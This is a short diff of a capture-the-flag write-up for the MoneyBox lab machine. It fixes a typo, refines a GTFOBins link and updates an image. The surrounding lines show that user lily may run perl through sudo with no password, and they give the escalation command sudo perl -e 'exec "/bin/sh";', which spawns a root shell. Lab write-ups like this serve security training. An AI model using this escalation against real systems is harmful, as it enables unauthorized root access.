@@ -286,11 +286,11 @@ User lily may run the following commands on MoneyBox:
     (ALL : ALL) NOPASSWD: /usr/bin/perl
 ```
 
-We can use this misconfigured SUID bit to escalaet our privileges.
+We can use this misconfigured SUID bit to escalate our privileges.
 
-We can find the this payload on [GTFOBins](https://gtfobins.github.io/).
+We can find the this payload on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo).
 
-![6](https://github.com/Kunull/Write-ups/assets/110326359/2d8df817-b70a-4887-aabd-d0534811f740)
+![6](https://github.com/user-attachments/assets/8f5d4d78-47e4-44b7-a3b3-eae0841acf19)
 
 ```
 lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
